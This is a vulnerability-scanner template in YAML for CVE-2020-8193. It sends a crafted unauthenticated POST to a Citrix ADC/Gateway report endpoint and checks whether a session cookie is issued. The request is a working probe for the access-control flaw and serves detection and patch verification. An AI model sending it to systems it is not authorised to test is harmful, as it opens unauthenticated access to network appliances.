id: CVE-2020-8193

info:
  name: Citrix unauthenticated LFI
  author: bufsnake
  severity: medium
  description: |
    Improper access control in Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allows unauthenticated access to certain URL endpoints.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-8193
  tags: cve,cve2020,citrix,lfi
  created: 2023/08/17

set:
  user: randomLowercase(8)
  pass: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1
      headers:
        Content-Type: application/xml
        X-NITRO-PASS: "{{pass}}"
        X-NITRO-USER: "{{user}}"
      body: <appfwprofile><login></login></appfwprofile>
    expression: response.status == 406 && "(?i)SESSID=\\w{32}".bmatches(bytes(response.headers["set-cookie"]))
expression: r0()
